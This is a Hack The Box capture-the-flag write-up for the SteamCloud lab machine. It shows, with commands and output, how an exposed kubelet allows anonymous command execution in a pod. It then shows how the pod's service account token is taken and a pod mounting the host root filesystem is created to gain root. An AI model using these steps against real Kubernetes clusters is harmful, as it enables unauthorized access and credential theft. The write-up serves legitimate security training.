# By vishok stemcloud
# htb writeup
####
####
####
## Open ports in the target machine
### Nmap:
```perl
22/tcp    open  ssh
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10249/tcp open  unknown
10250/tcp open  unknown
10256/tcp open  unknown
```
####
### Extract port:
To extract port we will do the next:
####
```ruby
echo '
    22/tcp    open  ssh
    2379/tcp  open  etcd-client
    2380/tcp  open  etcd-server
    8443/tcp  open  https-alt
    10249/tcp open  unknown
    10250/tcp open  unknown
    10256/tcp open  unknown
' | grep -oE '^([0-9])+' | sed -z 's/\n/,/g'
```
####
| Grep param | Description |
| ----- | ----- |
| -o | Make unique matches |
| -E | Find other results into a unique string |
####
| Sed param | Description |
| ----- | ----- |
| -z | Separate lines for each null character, is used to sustitute |
| s/ | Especify the start of the sustitution |
| /g | Especify the end of the sustitution |
####
### Nmap version:
```perl
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-05-01T18:57:11
|_Not valid after:  2026-05-01T18:57:11
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-05-01T18:57:11
|_Not valid after:  2026-05-01T18:57:11
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn't have a title (application/json).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-04-30T18:57:09
|_Not valid after:  2028-04-30T18:57:09
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 75fdb485-1a69-4531-93aa-c82612a28a89
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 27c7a370-8f54-4330-951b-0a2561b07e58
|     X-Kubernetes-Pf-Prioritylevel-Uid: 1cfa6a86-011a-421f-8896-f48d45d796c9
|     Date: Thu, 01 May 2025 19:36:00 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 91309591-653c-431b-a6be-8f2b0d09a98e
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 27c7a370-8f54-4330-951b-0a2561b07e58
|     X-Kubernetes-Pf-Prioritylevel-Uid: 1cfa6a86-011a-421f-8896-f48d45d796c9
|     Date: Thu, 01 May 2025 19:35:58 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 2e6e2155-a85e-4a92-8fe1-0f4a0a1b10b1
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 27c7a370-8f54-4330-951b-0a2561b07e58
|     X-Kubernetes-Pf-Prioritylevel-Uid: 1cfa6a86-011a-421f-8896-f48d45d796c9
|     Date: Thu, 01 May 2025 19:35:59 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1746125833
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2025-05-01T17:57:12
|_Not valid after:  2026-05-01T17:57:12
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
####
####
####
## Service that is running in the target machine
### HTTP:
In the target machine are running many *HTTP* services so we could try to enumerate them. The mayority ports, report us nothing interesting, but there one port that report us something different at the momentto start a enumeration proccess.
####
```ruby
wfuzz -c -u 'https://10.10.11.133:10250/FUZZ' -w /usr/share/wordlists/dictionary/web-content/directory-list-lowercase-2.3-medium.txt -t 200 --hc 404
```
####
| Wfuzz Param | Description |
| ----- | ----- |
| -c | Colors the displayed results |
| -u | Specifies the URL of the site to enumerate |
| -w | Specifies the path to the wordlist to use |
| -t | Specifies the number of parallel tasks to launch |
| -hc | (*Hide code*) Hides results with a specific status code |
####
The result is the next:
####
```ruby
000000171:   301        2    L      3 W        42 Ch     "stats"
000002126:   301        2    L      3 W        41 Ch     "logs"
000007664:   200        1743 L   4796 W    217892 Ch     "metrics"
000032692:   200        1    L      1 W     37847 Ch     "pods"
```
####
Well, we have 2 directories that return **200** status code: `metrics/` an `pods/`, almost not exist information, so we need to see what is the content in this directories because the other ports *2379* and *2380* have a way to get information. I found this article: [Etcd-Keys-API-Information-Gathering-Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/etcd/open_key_scanner). And mention that the information gathering run over **2379** port. But this aproach not work.
####
At the moment to consult those directories using the **curl** command, only the `pods/` directory report us something interesting:
####
```ruby
curl -s -k -X GET https://10.10.11.133:10250/pods
```
####
| Curl Param | Description |
| ----- | ----- |
| -s | Makes curl silent |
| -k | (*Insecure*) Allows curl to connect to sites with invalid certificates |
| -X | Specifies the *HTTP* method to use |
####
We are able to see **Kubernetes** in all information that the **curl** command report us. 
####
<div class="info">

> In **Kubernetes** (K8s) , a Pod is the smallest and most basic unit that can run. It represents one or more containers like **Docker**.
</div>

####
So having in mind that the **pods** form part that **kubernetes**. We could use the [*kubectl*, *kubeletctl*] binarie to execute commands in the target machine. [Kubeletctl-Binarie](https://github.com/cyberark/kubeletctl). This is the second tool that I mentioned previously because the first tool not work. How we see in the nmap scan, exist the **etcd** service one to **client** and the other to **server**. 
####
Looking for something interesting in the documentation of **kubectl**. We found one parameter: `exec`: https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#exec, with this command we can execute commands in the target machine, using this structure:
####
```ruby
kubectl exec mypod -c ruby-container -i -t -- bash -il

Modified ->
kubectl --server https://10.10.11.133:10250 exec pods -c nginx -- ls -la
```
####
But this not work instantaneously, we need to use the [*kubeletctl*] binarie. Executing that binarie: `./kubeletctl_linux_amd64 --server <ip_target_host> exec` need a container. But we don't now in what container run the target machine, beside, that information suggest us that the target machine have a containers, we could need to escape.
####
Executing: `./kubeletctl_linux_amd64` we can se this:
####
```ruby
pods          Get list of pods on the node
```
####
That paramater show us a list of all pods in the target machine:
####
```ruby
./kubeletctl_linux_amd64 --server 10.10.11.133 pods

Result ->                                                                   
[1]  kube-apiserver-steamcloud           kube-system  kube-apiserver         
[2]  kube-controller-manager-steamcloud  kube-system  kube-controller-manager
[3]  storage-provisioner                 kube-system  storage-provisioner    
[4]  kube-proxy-mwwjt                    kube-system  kube-proxy             
[5]  coredns-78fcd69978-858jg            kube-system  coredns                
[6]  nginx                               default      nginx                  
[7]  kube-scheduler-steamcloud           kube-system  kube-scheduler         
[8]  etcd-steamcloud                     kube-system  etcd                   
```
####
####
####
## First explotation phase
### Kubeletctl:
Now we have a containers, but if we prove with any container e.g. **etcd**, the target machine return: *Unable to...: pod does not exist*. So we need to prove with all container or dircover in what container run the target machine. That information we can saw at the moment to we made a **curl** request to the target machine:
####
```ruby
curl -s -k -X GET "https://10.10.11.133:10250/pods" | jq | grep ng

Result ->
"image": "nginx:1.14.2",
"imageID": "docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d"
```
####
| Curl Param | Description |
| ----- | ----- |
| -s | Makes curl silent |
| -k | (*Insecure*) Allows curl to connect to sites with invalid certificates |
| -X | Specifies the *HTTP* method to use |
####
Already we have the container, now we try to execute commands:
####
```ruby
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "ls -la" -p nginx -c nginx

Result ->
total 76
drwxr-xr-x   1 root root 4096 May  1 18:58 .
drwxr-xr-x   1 root root 4096 May  1 18:58 ..
-rwxr-xr-x   1 root root    0 May  1 18:58 .dockerenv
drwxr-xr-x   2 root root 4096 Mar 26  2019 bin
drwxr-xr-x   2 root root 4096 Feb  3  2019 boot
drwxr-xr-x   5 root root  360 May  1 18:58 dev
drwxr-xr-x   1 root root 4096 May  1 18:58 etc
drwxr-xr-x   2 root root 4096 Feb  3  2019 home
drwxr-xr-x   1 root root 4096 Mar 26  2019 lib
drwxr-xr-x   2 root root 4096 Mar 26  2019 lib64
drwxr-xr-x   2 root root 4096 Mar 26  2019 media
drwxr-xr-x   2 root root 4096 Mar 26  2019 mnt
drwxr-xr-x   2 root root 4096 Mar 26  2019 opt
dr-xr-xr-x 192 root root    0 May  1 18:58 proc
drwxr-xr-x   2 root root 4096 Nov 30  2021 root
drwxr-xr-x   1 root root 4096 May  1 18:58 run
drwxr-xr-x   2 root root 4096 Mar 26  2019 sbin
drwxr-xr-x   2 root root 4096 Mar 26  2019 srv
dr-xr-xr-x  13 root root    0 May  1 22:23 sys
drwxrwxrwt   1 root root 4096 Mar 26  2019 tmp
drwxr-xr-x   1 root root 4096 Mar 26  2019 usr
drwxr-xr-x   1 root root 4096 Mar 26  2019 var
```
####
The problem now is that the container can't establish a revershell with us. The common *One-liners* not work, exist **bash**, **sh**, **mkfifo**, but although we encrypted the data using base64, the revershell not work. The only way to get a *CLI* in the target machine is:
####
```ruby
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "bash" -p nginx -c nginx
```
####
This access is not adequate because it does not give us a fully interactive shell, so we will have to treat the *TTY* before proceeding with privilege escalation. This process is called: *TTY treatment*.
####
```ruby
1. script -c bash /dev/null
2. ctrl + z
3. stty raw -echo; fg
4. 	  reset xterm
5. export TERM=xterm
```
#### 
Looking for something interesting in the target machine, we can see that the `/var` directorie have a hepful information: `run/secrets/kubernetes.io/serviceaccount`. That directorie posses a `ca.crt` certificate file, a JWT [*Json Web Token*] file and a **namespace** file:
####
```ruby
echo '
    -----BEGIN CERTIFICATE-----
    MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
    a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA...
' > ca.crt

echo ' eyJhbGciOiJSUzI1NiIsImtpZCI6Ik5OOFpMbEoyb0FVTVFLVVNwWDNPZDJjY... ' > token

Namespace -> default
```
####
So, we already have a credentials and the version of the nginx, we can related that information, the explotaion phase is over **kubernetes** and **nginx**.
####
####
####
## Second exploit phase (Privilage Escalation)
### Mount:
When we execute both commands, **kubectl** and **kubeletctl** the apply parameter exist. So we could try to change the configuration where nginx container is mounted. But only the **kubectl** work with this files:
####
```ruby
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token)
```
####
The container is **nginx** so we could try to get the json config: 
####
```ruby
kubectl get pods nginx --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token) -o json
```
####
The config have a specifique data, like namespace, image, path, etc... So having that in mind effectively we could try to apply a new config to mount the **nginx image** over `/` path, if we run this container over `/` path and not over `/var/run/secrets/kubernetes.io/serviceaccount`, we can be the root user. The structure is this:
####
<div class="warning">

> The format not work in **JSON**, this need to be changed a **YAML** format.
</div>

####
```ruby
echo '
    apiVersion: v1
    kind: Pod
    metadata:
    name: shell
    namespace: default -> Namespace
    spec:
    containers:
    - name: shell
        image: nginx:1.14.2 -> Image container
        volumeMounts:
        - mountPath: /mnt
        name: hostfs
    volumes:
    - name: hostfs
        hostPath:
        path: / -> This is the mount path
    automountServiceAccountToken: true
    hostNetwork: true
' > payload.yaml
```
####
To apply this information we need to execute this:
####
```ruby
kubectl apply -f payload.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token) --validate=false

Output ->
    pod/shell created
```
#### 
How we execute the command previously, now we need to do the same:
####
```ruby
./kubeletctl_linux_amd64 exec "id" --server 10.10.11.133 -p shell -c shell

Output -> 
    uid=0(root) gid=0(root) groups=0(root)
```
####
Now we are the **root** user. Is only to find the root flag in the target machine. Remenber, the path is not the common, now is in `/mnt` directorie, is here where run the `/` path. Also to gain access like root user is execute the next command: `./kubeletctl_linux_amd64 exec "bash" --server 10.10.11.133 -p shell -c shell`.